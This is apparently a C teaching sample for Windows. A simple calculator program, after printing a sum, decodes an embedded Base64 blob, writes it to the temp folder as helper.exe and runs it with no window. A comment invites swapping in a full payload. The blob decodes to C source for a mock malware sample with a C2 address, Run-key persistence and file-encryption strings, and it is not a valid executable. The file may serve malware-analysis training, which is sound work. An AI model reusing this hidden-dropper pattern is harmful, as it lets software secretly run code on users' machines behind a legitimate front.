#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>

#pragma comment(lib, "crypt32.lib")

// Base64-encoded helper.exe (shortened for demo)
// Replace with FULL Base64 string
const char helper_b64[] =
"I2luY2x1ZGUgPHdpbmRvd3MuaD4KI2luY2x1ZGUgPHN0ZGlvLmg+CgovLyA9PT0gU3VzcGljaW91\ncyBzdHJpbmdzIGZvciBzdGF0aWMgYW5hbHlzaXMgPT09CmNoYXIgKmMyX3VybCA9ICJodHRwOi8v\nMTg1LjIwMy4xMTYuNDIvYmVhY29uIjsKY2hhciAqdXNlcl9hZ2VudCA9ICJNb3ppbGxhLzUuMCAo\nV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSI7CmNoYXIgKnJ1bl9rZXkgPSAiU29mdHdhcmVc\nTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIjsKY2hhciAqbXV0ZXhfbmFtZSA9\nICJHbG9iYWxcRkFLRU1BTFdBUkVfTVVURVgiOwpjaGFyICpwYXlsb2FkX25hbWUgPSAiZW5jcnlw\ndF9maWxlcyI7CmNoYXIgKmZha2VfY3J5cHRvID0gIkFFUy0yNTYtQ0JDIjsKCi8vID09PSBGYWtl\nIHBlcnNpc3RlbmNlIGZ1bmN0aW9uIChuZXZlciBjYWxsZWQpID09PQp2b2lkIGluc3RhbGxfcGVy\nc2lzdGVuY2UoKSB7CiAgICAvLyBBbmFseXN0cyBzaG91bGQgc2VlIFJlZ1NldFZhbHVlRXggaW4g\naW1wb3J0cwogICAgUmVnU2V0VmFsdWVFeEEoCiAgICAgICAgSEtFWV9DVVJSRU5UX1VTRVIsCiAg\nICAgICAgIkZha2VVcGRhdGVyIiwKICAgICAgICAwLAogICAgICAgIFJFR19TWiwKICAgICAgICAo\nQllURSAqKSJDOlxVc2Vyc1xQdWJsaWNcdXBkYXRlci5leGUiLAogICAgICAgIDMyCiAgICApOwp9\nCgovLyA9PT0gRmFrZSBuZXR3b3JrIGZ1bmN0aW9uIChuZXZlciBjYWxsZWQpID09PQp2b2lkIGJl\nYWNvbigpIHsKICAgIHByaW50ZigiQ29ubmVjdGluZyB0byAlcyB3aXRoIFVBICVzCiIsIGMyX3Vy\nbCwgdXNlcl9hZ2VudCk7Cn0KCi8vID09PSBEZWNveSBsZWdpdGltYXRlLWxvb2tpbmcgY29kZSA9\nPT0KaW50IGNhbGN1bGF0ZV9jaGVja3N1bShpbnQgYSwgaW50IGIpIHsKICAgIHJldHVybiAoYSAq\nIDEzMzcpIF4gYjsKfQoKaW50IG1haW4oKSB7CiAgICAvLyBQcm9ncmFtIGRvZXMgbm90aGluZyBo\nYXJtZnVsCiAgICAvLyBTdHJpbmdzICsgaW1wb3J0cyBhcmUgdGhlIGxlc3NvbgogICAgcHJpbnRm\nKCJVcGRhdGVyIHJ1bm5pbmcuLi4KIik7CiAgICByZXR1cm4gMDsKfQo=\n";

void run_hidden_helper() {
    DWORD size = 0;
    BYTE *buffer = NULL;

    // Get decoded size
    CryptStringToBinaryA(
        helper_b64,
        0,
        CRYPT_STRING_BASE64,
        NULL,
        &size,
        NULL,
        NULL
    );

    buffer = (BYTE*)malloc(size);

    // Decode Base64
    CryptStringToBinaryA(
        helper_b64,
        0,
        CRYPT_STRING_BASE64,
        buffer,
        &size,
        NULL,
        NULL
    );

    char path[MAX_PATH];
    GetTempPathA(MAX_PATH, path);
    strcat(path, "helper.exe");

    FILE *f = fopen(path, "wb");
    fwrite(buffer, 1, size, f);
    fclose(f);

    // Execute silently
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    CreateProcessA(
        path,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );
}

int main() {
    int a, b;

    printf("=== Simple Calculator ===\n");
    printf("Enter first number: ");
    scanf("%d", &a);

    printf("Enter second number: ");
    scanf("%d", &b);

    printf("\nResult: %d\n", a + b);

    // 👀 Sneaky behavior hidden behind legit functionality
    run_hidden_helper();

    return 0;
}

